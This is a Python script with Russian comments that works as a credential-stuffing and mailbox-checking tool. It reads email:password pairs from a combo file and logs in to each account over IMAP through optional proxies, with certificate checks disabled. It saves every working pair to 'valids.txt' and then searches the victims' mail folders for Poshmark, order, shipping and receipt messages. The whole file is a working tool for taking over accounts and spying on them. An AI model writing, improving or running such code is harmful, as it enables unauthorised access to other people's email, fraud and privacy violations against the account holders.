# dbtest4.py
import sqlite3
import imaplib
import email
from email.header import decode_header
import os
import ssl
import socket
from contextlib import contextmanager
from urllib.parse import urlparse

DB_PATH = "/home/raw/prosch/web/app/imapdatabase.db"
VALIDS_PATH = "/home/raw/prosch/web/app/valids.txt"


def normalize_proxy_url(proxy_value: str | None) -> str | None:
    """
    Поддерживает:
      1) socks5://user:pass@host:port
      2) http://user:pass@host:port
      3) ip:port
      4) ip:port:user:pass
    Для (3)/(4) по умолчанию делаем socks5://...
    """
    if not proxy_value:
        return None

    raw = proxy_value.strip()
    if not raw:
        return None

    if "://" in raw:
        return raw  # уже URL-формат

    parts = raw.split(":")
    if len(parts) == 2:
        ip, port = parts
        return f"socks5://{ip}:{port}"

    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"socks5://{user}:{pwd}@{ip}:{port}"

    raise ValueError(f"Неподдерживаемый формат прокси: {proxy_value}")


def parse_proxy_url(proxy_url: str) -> dict:
    """
    Поддержка:
      socks5://host:port
      socks5://user:pass@host:port
      socks4://host:port
      http://host:port
      http://user:pass@host:port
      https://host:port
    """
    p = urlparse(proxy_url.strip())
    if p.scheme.lower() not in {"socks5", "socks4", "http", "https"}:
        raise ValueError(f"Unsupported proxy scheme: {p.scheme}")

    if not p.hostname or not p.port:
        raise ValueError("Proxy must contain host:port")

    return {
        "scheme": p.scheme.lower(),
        "host": p.hostname,
        "port": int(p.port),
        "username": p.username,
        "password": p.password,
    }


@contextmanager
def proxy_socket(proxy_url: str | None):
    """
    Временная подмена socket.socket на socks.socksocket
    для imaplib (он сам не умеет proxy).
    """
    if not proxy_url:
        yield
        return

    try:
        import socks  # pip install pysocks
    except ImportError as e:
        raise RuntimeError("Нужен PySocks: pip install pysocks") from e

    cfg = parse_proxy_url(proxy_url)
    scheme_map = {
        "socks5": socks.SOCKS5,
        "socks4": socks.SOCKS4,
        "http": socks.HTTP,
        "https": socks.HTTP,
    }

    original_socket = socket.socket
    socks.set_default_proxy(
        scheme_map[cfg["scheme"]],
        addr=cfg["host"],
        port=cfg["port"],
        username=cfg["username"],
        password=cfg["password"],
    )
    socket.socket = socks.socksocket
    try:
        yield
    finally:
        socket.socket = original_socket


def get_imap(email_addr: str) -> dict | None:
    email_addr = email_addr.strip().lower()
    if "@" not in email_addr:
        return {"error": "Некорректный email"}
    domain = email_addr.split("@")[-1]

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    for table in "0123456789ABCDEF":
        cursor.execute(
            f'SELECT Server, Port, Socket FROM "{table}" WHERE Server = ? OR Server = ? LIMIT 1',
            (domain, f"imap.{domain}"),
        )
        row = cursor.fetchone()
        if row:
            server, port, socket_type = row
            conn.close()
            return {
                "domain": domain,
                "imap": server.strip().rstrip("."),
                "imap_port": int(port),
                "ssl": socket_type == 0,
            }
    conn.close()
    return None


def connect_imap(email_addr: str, password: str, proxy_url: str | None = None):
    settings = get_imap(email_addr)
    if not settings or "error" in settings:
        print(f"❌ Настройки не найдены для {email_addr}")
        return None

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.set_ciphers("DEFAULT@SECLEVEL=1")

    # NEW: поддержка ip:port и ip:port:user:pass
    try:
        normalized_proxy_url = normalize_proxy_url(proxy_url)
    except Exception as e:
        print(f"❌ Неверный формат прокси '{proxy_url}': {e}")
        return None

    proxy_info = f" via {normalized_proxy_url}" if normalized_proxy_url else ""
    print(
        f"📡 Подключаемся к {settings['imap']}:{settings['imap_port']} "
        f"(SSL: {settings['ssl']}){proxy_info}"
    )

    try:
        with proxy_socket(normalized_proxy_url):
            if settings["ssl"]:
                mail = imaplib.IMAP4_SSL(
                    settings["imap"],
                    settings["imap_port"],
                    ssl_context=context,
                    timeout=15,
                )
            else:
                mail = imaplib.IMAP4(settings["imap"], settings["imap_port"], timeout=15)
                try:
                    mail.starttls(ssl_context=context)
                except Exception:
                    pass

            mail.login(email_addr, password)
            print(f"✅ Успешно вошли: {email_addr}")

            with open(VALIDS_PATH, "a", encoding="utf-8") as f:
                f.write(f"{email_addr}:{password}\n")

            return mail
    except Exception as e:
        print(f"❌ Ошибка соединения/авторизации: {e}")
        return None


def find_emails(mail, keywords: list):
    try:
        status, folder_list = mail.list()
        if status != "OK" or not folder_list:
            print("⚠️ Не удалось получить список папок")
            return

        found_any = False
        for f in folder_list:
            folder_name = f.decode(errors="ignore").split('"/"')[-1].strip().strip('"')
            res, _ = mail.select(f'"{folder_name}"', readonly=True)
            if res != "OK":
                continue

            for word in keywords:
                search_query = f'(OR FROM "{word}" SUBJECT "{word}")'
                status, data = mail.search(None, search_query)
                if status != "OK" or not data or not data[0]:
                    continue

                ids = data[0].split()
                if ids:
                    print(f"  ✨ Найдено {len(ids)} шт. ('{word}') в папке '{folder_name}'")
                    found_any = True
                    fetch_and_print_msg(mail, ids[-1])

        if not found_any:
            print("❌ Ничего интересного не найдено.")
    except Exception as e:
        print(f"⚠️ Ошибка при поиске: {e}")


def fetch_and_print_msg(mail, msg_id):
    status, data = mail.fetch(msg_id, "(RFC822)")
    if status != "OK" or not data or not data[0]:
        return

    msg = email.message_from_bytes(data[0][1])
    subject, enc = decode_header(msg.get("Subject", ""))[0]
    if isinstance(subject, bytes):
        subject = subject.decode(enc or "utf-8", errors="ignore")
    print(f"    📝 Тема: {subject} | От: {msg.get('From')}")


def process_accounts_from_file(filepath: str, keywords: list, proxy_url: str | None = None):
    if not os.path.exists(filepath):
        print(f"❌ Файл не найден: {filepath}")
        return

    with open(filepath, "r", encoding="utf-8") as file:
        for line in file:
            line = line.strip()
            if not line or ":" not in line:
                continue

            email_addr, password = line.split(":", 1)
            print(f"\n{'=' * 60}\n⏳ Проверка: {email_addr.strip()}")

            client = connect_imap(email_addr.strip(), password.strip(), proxy_url=proxy_url)
            if client:
                find_emails(client, keywords)
                try:
                    client.logout()
                except Exception:
                    pass


if __name__ == "__main__":
    ACCOUNTS_FILE = "/home/raw/prosch/web/app/mix.txt"
    SEARCH_KEYWORDS = ["poshmark", "order", "shipping", "delivery", "receipt"]

    # работает и так:
    # PROXY_URL = "ip:port"
    # PROXY_URL = "ip:port:user:pass"
    # PROXY_URL = "socks5://user:pass@ip:port"
    PROXY_URL = None

    process_accounts_from_file(ACCOUNTS_FILE, SEARCH_KEYWORDS, proxy_url=PROXY_URL)